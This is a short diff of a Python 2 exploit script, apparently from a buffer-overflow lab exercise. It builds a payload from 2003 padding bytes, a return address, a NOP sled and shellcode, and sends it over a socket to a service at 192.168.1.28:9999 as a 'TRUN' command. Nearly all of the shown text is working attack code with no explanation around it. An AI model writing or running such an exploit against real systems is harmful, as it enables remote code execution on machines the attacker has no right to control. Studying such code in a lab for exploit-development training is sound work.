@@ -29,5 +29,14 @@ shellcode = (
 "\xff\xec\xb3\x4b\x7c\x04\x4c\xa8\x9c\x6d\x49\xf4\x1a\x9e\x23"
 "\x65\xcf\xa0\x90\x86\xda"
 )
-overflow = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + shellcode
 
+overflow = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + str(shellcode)
+try:
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(('192.168.1.28',9999))
+    s.send(('TRUN /.:/'+overflow))
+    s.close()
+
+except:
+    print 'error connecting server'
+    sys.exit()
